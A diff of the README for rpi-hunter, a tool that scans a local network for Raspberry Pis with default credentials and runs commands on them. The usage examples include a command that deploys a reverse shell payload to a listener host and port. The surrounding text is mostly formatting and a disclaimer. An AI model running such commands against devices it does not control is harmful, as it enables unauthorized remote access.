@@ -19,10 +19,8 @@ Rpi-hunter is  useful when there are multiple Raspberry Pi's on your LAN with de
 
 ## Usage
 
-Check out this sweet ![video](https://www.youtube.com/watch?v=qApJyIkDYvQ) and the accompanying [write-up](https://null-byte.wonderhowto.com/how-to/discover-attack-raspberry-pis-using-default-credentials-with-rpi-hunter-0193855/) made by the people over at NullByte!
-
-
-	* Note: For the new people, I made a few updates to rpi-hunter to fix some bugs and add some more features :) Running the command `./rpi-hunter.py` will automatically scan your whole local network and run the `whoami` command on any raspberry pi's it finds
+Check out this sweet [video](https://www.youtube.com/watch?v=qApJyIkDYvQ) and the accompanying [write-up](https://null-byte.wonderhowto.com/how-to/discover-attack-raspberry-pis-using-default-credentials-with-rpi-hunter-0193855/) made by the people over at NullByte!
+* **Note:** For the new people, I made a few updates to rpi-hunter to fix some bugs and add some more features :) Running the command `./rpi-hunter.py` will automatically scan your whole local network and run the `whoami` command on any raspberry pi's it finds
 
 ```
 usage: rpi-hunter.py [-h] [--list] [--no-scan] [-r IP_RANGE] [-f IP_LIST]
@@ -50,10 +48,11 @@ optional arguments:
 
 * Example usage: 
 	* `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337`
-	* `./rpi-hunter.py -r 192.168.2.0/16 -c lamepassword --payload "ls -lah \~"`
-
-## Disclaimer
+    	* **Note:** only the "reverse_shell" payload requires the `-H` and `-P` flags
+	* `./rpi-hunter.py -c lamepassword --payload "ls -lah \~"`
+    	* **Note:** make sure to escape special characters with a `\` 
+---
+# ***Disclaimer:***
 ## The standard internet fun disclaimer applies. Don't commit crimes, be responsible.
-
 ## I am in no way responsible for anything and everything you do with rpi-hunter.
 
